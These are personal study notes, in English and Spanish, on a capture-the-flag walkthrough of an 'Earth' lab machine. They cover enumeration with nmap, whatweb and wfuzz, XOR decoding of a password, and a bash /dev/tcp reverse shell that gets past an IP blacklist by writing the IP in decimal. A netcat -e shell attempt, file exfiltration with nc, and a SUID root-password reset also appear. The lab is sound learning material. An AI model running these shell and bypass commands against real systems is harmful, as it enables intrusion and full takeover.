Skills

- Web Enumeration
- Information Leakage
- Playing with XOR - Crypto Challenge

- Abusing Admin Command Tool - Bypassing IP address restriction for Reverse Shell
- Abusing SUID Privilege [Privilege Escalation]

Certifications

eWPT

(zchrc es una zsh o una zbash)

it is a good idea to put scripts on the /usr/bin (new created scripts , that helps us with pentesting, so we can use them by default on the path route)

bat (averigua como usarlo)
xargs(averigua como usarlo)
cat (transforma tu cat a bat)

```
nmap -p- --open -sS -n -Pn --min-rate 5000 192.168.0.66 -vvv -oN allports
```
when we do not find nothing, we must watch on filtered ports , and then on another protocols, TCP, UDP on our scann
```
sudo nmap -sVC -p 22,80,443 192.168.0.66 -oN targeted
```

we apply a script , it is for watching routes on the http protocol
```
sudo nmap --script http-enum -p80,443 192.168.0.66 -oN webScan
```

If the port 443 it's open we can try to connect with openssl 

```
OpenSSL es un proyecto de software libre basado en SSLeay, desarrollado por Eric Young y Tim Hudson. Consiste en un robusto paquete de herramientas de administración y bibliotecas relacionadas con la criptografía, que suministran funciones criptográficas a otros paquetes como OpenSSH y navegadores web.   

**OpenSSL** es un conjunto **de** herramientas y librerías criptográficas **de** código abierto utilizada principalmente **para** implementar el uso **de** Secure Sockets Layer (SSL) y Transport Layer Security (TLS) (entre otros protocolos **de** seguridad) en las conexiones a Internet, así como **para** crear certificados digitales
```
this is the command
```
openssl s_client -connect 192.168.0.66:443
```
this gives us more information about the website

He uses ping -c 1 earth.local , this is important to do it 

lets watch on whatweb to see even more information

whatweb http://192.168.0.66 (watweb es como un wapalizer, actua en nivel de consola , pero no es tan potente , asi dice)

```
whatweb http://192.168.0.66
http://192.168.0.66 [400 Bad Request] Apache[2.4.51][mod_wsgi/4.7.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Fedora Linux][Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9], IP[192.168.0.66], OpenSSL[1.1.1l], Python[3.9], Title[Bad Request (400)], UncommonHeaders[x-content-type-options,referrer-policy]  
```

if try to watch with https it is the same

But if we watch on whatweb http://earth.local its different
```
[200 OK] Apache[2.4.51][mod_wsgi/4.7.1], Cookies[csrftoken], Country[RESERVED][ZZ], Django, HTML5, HTTPServer[Fedora Linux][Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9], IP[192.168.0.66], OpenSSL[1.1.1l], Python[3.9], Title[Earth Secure Messaging], UncommonHeaders[x-content-type-options,referrer-policy], X-Frame-Options[DENY]
```

and whatweb http://terratest.earth.local 
```
https://terratest.earth.local [200 OK] Apache[2.4.51][mod_wsgi/4.7.1], Country[RESERVED][ZZ], HTTPServer[Fedora Linux][Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9], IP[192.168.0.67], OpenSSL[1.1.1l], Python[3.9]      
```

In the page of earth.tesst the codes are on hexadecimal, on linux there is one command to decode hexadecimals and it is 
```
echo -n "codehexadecimal" | xxd -ps -r 
```

in this case s4viar uses this like on bottom and it returns in a legible way(not so legible .. but you ca see it better) 
```
echo -n "codehexadecimal" | xxd -ps -r | xxd 
```
this is , a cyphred on xor

en pyhon
```
>>>2 ^ 6
4
>>>2 ^ 6 =4 

>>>6  ^  4 
2

>>> 2 ^ 4 
6
```

So... with the strings , this is the same

message ^ key = cypred code

He says .. I have no key so i need to watch it for decypher the code

cypred ^ key = message


we have things here

https://terratest.earth.local/robots.txt
 
 
 with wfuzz we are going to see
-c = reports colors 
--hc = ignores 404 messages
-t =threads
-w = dictionary
 /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

 
 
 wfuzz -c --hc=404 -t 200 -w /
 
 but he is going to do another thing...
 
 first copy the /robots.txt
 
 ```
 
echo 'Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml' | awk 'NF{print $NF}'
```
ON THIS WAY WE STAY WITH THE LAST ARGUMENT

```
/*.asp
/*.aspx
/*.bat
/*.c
/*.cfm
/*.cgi
/*.com
/*.dll
/*.exe
/*.htm
/*.html
/*.inc
/*.jhtml
/*.jsa
/*.json
/*.jsp
/*.log
/*.mdb
/*.nsf
/*.php
/*.phtml
/*.pl
/*.reg
/*.sh
/*.shtml
/*.sql
/*.txt
/*.xml
```
This is the result

TOma e segundo argumento tomando como delimitador el punto.. o sea primer argumento el punto y segundo argumento lo que sigue

| awk '{print $2}' FS="."

```
echo 'Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml' | awk 'NF{print $NF}' | awk '{print $2}' FS="."
```

we have this

```
asp
aspx
bat
c
cfm
cgi
com
dll
exe
htm
html
inc
jhtml
jsa
json
jsp
log
mdb
nsf
php
phtml
pl
reg
sh
shtml
sql
txt
xml

```
 | xargs 
 
 puts all in the same line 
 
 and  | tr " " "-"
 
 changes the " " by "-"
 
 ```
 cds@cds:~$ echo 'Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml' | awk 'NF{print $NF}' | awk '{print $2}' FS="." | xargs | tr " " "-"
asp-aspx-bat-c-cfm-cgi-com-dll-exe-htm-html-inc-jhtml-jsa-json-jsp-log-mdb-nsf-php-phtml-pl-reg-sh-shtml-sql-txt-xml
```
so this is the final command

wfuzz -c --hc=404 -z list,asp-aspx-bat-c-cfm-cgi-com-dll-exe-htm-html-inc-jhtml-jsa-json-jsp-log-mdb-nsf-php-phtml-pl-reg-sh-shtml-sql-txt-xml https://terratest.earth.local/testingnotes.FUZZ

```
cds@cds:~$ wfuzz -c --hc=404 -z list,asp-aspx-bat-c-cfm-cgi-com-dll-exe-htm-html-inc-jhtml-jsa-json-jsp-log-mdb-nsf-php-phtml-pl-reg-sh-shtml-sql-txt-xml https://terratest.earth.local/testingnotes.FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://terratest.earth.local/testingnotes.FUZZ
Total requests: 28

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000027:   200        9 L      90 W       546 Ch      "txt"                                                                                                

Total time: 0
Processed Requests: 28
Filtered Requests: 27
Requests/sec.: 0

```
now it found one .txt
And this is what testing notes say
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```


we have an user called

terra

and in another folder the encryption key

we must login in

http://terratest.earth.local/admin/

decoding it from xorg, the key is this

earthclimatechangebad4humans

so user:
terra 
password:
earthclimatechangebad4humans

xor no es muy bueno, si tienes dos componentes puedes encontrar el tercero

This page is "secured", he said this when he put ls -l 

and he puts which nc, and it returned the route of netcat

so.. if we listen on a terminal an then we put

nc -e /bin/bash (my ip) (port)

and "remote conections are forbidden"


(averiguar sobre stdr and stdout)
stdr se transforma en stdout con 2>&1 y podemos ver los errores..

there is a "blacklist" or something that impides us to use patterns like an ip

so we cannot do the classic shell, for the pattern but if we transform the ip to decimal, we can 

google ip to decimal converter

bash -i >& /dev/tcp/3232261124
/443 0>&1

on this way we have the shell , because we are listening with netcat

now we need to do the treatment to the tty

script /dev/null -c bash

stty raw -echo ;fg

reset xterm
(DONT FORGET THE EXPORT)
export TERM=xterm

export SHELL=/bin/bash
(because now the value is no loggin)

I have no permision with "id" command

we must search something
```
bash-5.1$ find / -name admin 2>/dev/null
/usr/local/lib/python3.9/site-packages/django/contrib/admin
/usr/local/lib/python3.9/site-packages/django/contrib/admin/static/admin
/usr/local/lib/python3.9/site-packages/django/contrib/admin/static/admin/js/admin
/usr/local/lib/python3.9/site-packages/django/contrib/admin/templates/admin
/usr/local/lib/python3.9/site-packages/django/contrib/gis/admin
/usr/local/lib/python3.9/site-packages/django/contrib/gis/templates/gis/admin
```
this is not the folder... we need to find the httpd folder, an see how its the site mounted

```
bash-5.1$ find / -name httpd 2>/dev/null
/run/httpd
/etc/logrotate.d/httpd
/etc/httpd
/var/lib/httpd
/var/log/httpd
/var/cache/httpd
/usr/sbin/httpd
/usr/lib64/httpd
/usr/share/doc/httpd
/usr/share/httpd
/usr/libexec/initscripts/legacy-actions/httpd
```
etc/httpd (on fedora) the server archives
etc/apache (debian) the server archives

Lets look if there are some SUID group permisions 
find / -perm -4000 -ls 2>/dev/nul
```
¿Qué hace el comando >2/dev/null en Linux?

Esto redirecciona la salida estándar de errores (stderr), al dispositvo nulo (/dev/null). En otras palabras, después de este comando ya no verás errores pues todos ellos se iran al “vacío”.

EL operador “>” es para redireccionar la salida de un comando a “otro lado”, generalmente a otro archivo o fichero en Unix (Linux, BSD, AIX, HP-UX y todo sistema operativo de la familia *nix)

> archivo , redirecciona la salida estándar (stdout) a “archivo”

1> archivo , redirecciona igualmente la salida estándar (stdout) a “archivo”

2> archivo , redirecciona la salida estándar de errores (stderr) a “archivo”

&> archivo , redirecciona ambas, stdout y stderr a “archivo”.

/dev/null es el dispositivo nulo, la nada, el vacío.

Evidentemente debes conocer como se manejan los objetos en *nix y entender que se puede decir que todo en *nix está virtualmente representado por un archivo o fichero.

Claramente esto es bastante abstracto.
```

```
bash-5.1$ find / -perm -4000 -ls 2>/dev/null
 12851509     76 -rwsr-xr-x   1 root     root        74208 Aug  9  2021 /usr/bin/chage
 12747606     80 -rwsr-xr-x   1 root     root        78536 Aug  9  2021 /usr/bin/gpasswd
 12747609     44 -rwsr-xr-x   1 root     root        42256 Aug  9  2021 /usr/bin/newgrp
 12851796     60 -rwsr-xr-x   1 root     root        58384 Feb 12  2021 /usr/bin/su
 12851780     52 -rwsr-xr-x   1 root     root        49920 Feb 12  2021 /usr/bin/mount
 12851799     40 -rwsr-xr-x   1 root     root        37560 Feb 12  2021 /usr/bin/umount
 12671177     32 -rwsr-xr-x   1 root     root        32648 Jun  3  2021 /usr/bin/pkexec
 13256412     32 -rwsr-xr-x   1 root     root        32712 Jan 30  2021 /usr/bin/passwd
 13256418     36 -rws--x--x   1 root     root        33488 Feb 12  2021 /usr/bin/chfn
 13256419     28 -rws--x--x   1 root     root        25264 Feb 12  2021 /usr/bin/chsh
 13256550     60 -rwsr-xr-x   1 root     root        57432 Jan 26  2021 /usr/bin/at
 13258486    184 ---s--x--x   1 root     root       185504 Jan 26  2021 /usr/bin/sudo
 12961001     24 -rwsr-xr-x   1 root     root        24552 Oct 12  2021 /usr/bin/reset_root
   467872     16 -rwsr-xr-x   1 root     root        15632 Sep 29  2021 /usr/sbin/grub2-set-bootflag
   468250     16 -rwsr-xr-x   1 root     root        16096 Jun 10  2021 /usr/sbin/pam_timestamp_check
   468252     24 -rwsr-xr-x   1 root     root        24552 Jun 10  2021 /usr/sbin/unix_chkpwd
   879418    116 -rwsr-xr-x   1 root     root       116064 Sep 23  2021 /usr/sbin/mount.nfs
  4352689     24 -rwsr-xr-x   1 root     root        24536 Jun  3  2021 /usr/lib/polkit-1/polkit-agent-helper-1
bash-5.1$ 
```

we see the pkexec, a knowed critical one and /usr/bin/reset_root

we cannot execute "/usr/bin/reset_root"
because we have not all the triggers 

from the target
```
bash-5.1$ nc 192.168.100.4 443 < /usr/bin/reset_root
bash-5.1$ 
```
to my pc
```
h/s4vitar/content$ nc -nlvp 443 >reset_root
listening on [any] 443 ...
connect to [192.168.100.4] from (UNKNOWN) [192.168.100.59] 42068
```
we are looking with ltrace what is happening on instruction levels


So there are no triggers.. we must create the triggers(folders), because this are static values, it doesnt change when we operate the command
```
ltrace ./reset_root
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                           = 38
access("/dev/shm/kHgTFI5G", 0)                                                                        = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                        = -1
access("/tmp/kcM0Wewe", 0)                                                                            = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                           = 44
+++ exited (status 0) +++
```

We can now execute the file and the password for root is Earth
```
CHECKING IF RESET TRIGGERS PRESENT...                                                                                                                                 
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth                                                                                                         
bash-5.1$ su                                          
Password:(Earth)                                               
[root@earth /]#          
```

pwdx (da datos sobre donde se esta montando un proceso, puede ser un servidor por ejemplo, montado en python. Y con este comando te permite saber desde que ruta se esta ejecutando)